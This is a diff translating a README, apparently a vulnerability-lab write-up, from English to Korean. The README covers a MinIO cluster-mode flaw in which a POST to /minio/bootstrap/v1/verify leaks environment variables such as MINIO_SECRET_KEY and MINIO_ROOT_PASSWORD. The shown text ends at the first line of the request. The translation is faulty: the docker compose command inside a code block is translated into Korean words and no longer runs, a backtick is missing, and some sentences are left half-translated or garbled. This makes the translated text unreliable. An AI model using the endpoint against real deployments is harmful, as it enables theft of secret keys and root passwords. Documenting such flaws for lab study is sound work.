@@ -2,9 +2,9 @@
 
 [中文版本(Chinese version)](README.zh-cn.md)
 
-MinIO is a High Performance Object Storage released under GNU Affero General Public License v3.0.
+MinIO는 GNU Affero 일반 공중 사용 허가서 v3.0에 따라 출시된 고성능 오브젝트 스토리지입니다.
 
-In the version before `RELEASE.2023-03-20T20-16-18Z`, there is an information disclosure vulnerability if MinIO is deployed in cluster mode. An attacker can use an HTTP request to obtain all environment variables of the target process, including `MINIO_SECRET_KEY` and `MINIO_ROOT_PASSWORD`.
+RELEASE.2023-03-20T20-16-18Z` 이전 버전에서 MinIO를 클러스터 모드로 배포할 경우 정보 유출 취약점이 존재합니다. 공격자는 HTTP 요청을 통해 `MINIO_SECRET_KEY`, `MINIO_ROOT_PASSWORD`를 포함한 대상 프로세스의 모든 환경 변수를 획득할 수 있습니다.
 
 References:
 
@@ -13,17 +13,17 @@ References:
 
 ## Vulnerable Environment
 
-Executing following commands to start a MinIO cluster:
+다음 명령을 실행하여 MinIO 클러스터를 시작합니다:
 
 ```
-docker compose up -d
+도커 컴포즈 업 -d
 ```
 
-After the cluster has been started, you can browse Web console on `http://your-ip:9001`, API server on `http://your-ip:9000`.
+클러스터가 시작되면 다음에서 웹 콘솔을 탐색할 수 있습니다. `http://your-ip:9001`, API server on `http://your-ip:9000`.
 
 ## Vulnerability Reproduce
 
-The issue exists in the API endpoint `http://your-ip:9000/minio/bootstrap/v1/verify`. Send the request to retrieve all environment variables:
+The issue exists in the API endpoint `http://your-ip:9000/minio/bootstrap/v1/verify`. 모든 환경 변수를 검색하도록 요청을 보냅니다:
 
 ```
 POST /minio/bootstrap/v1/verify HTTP/1.1
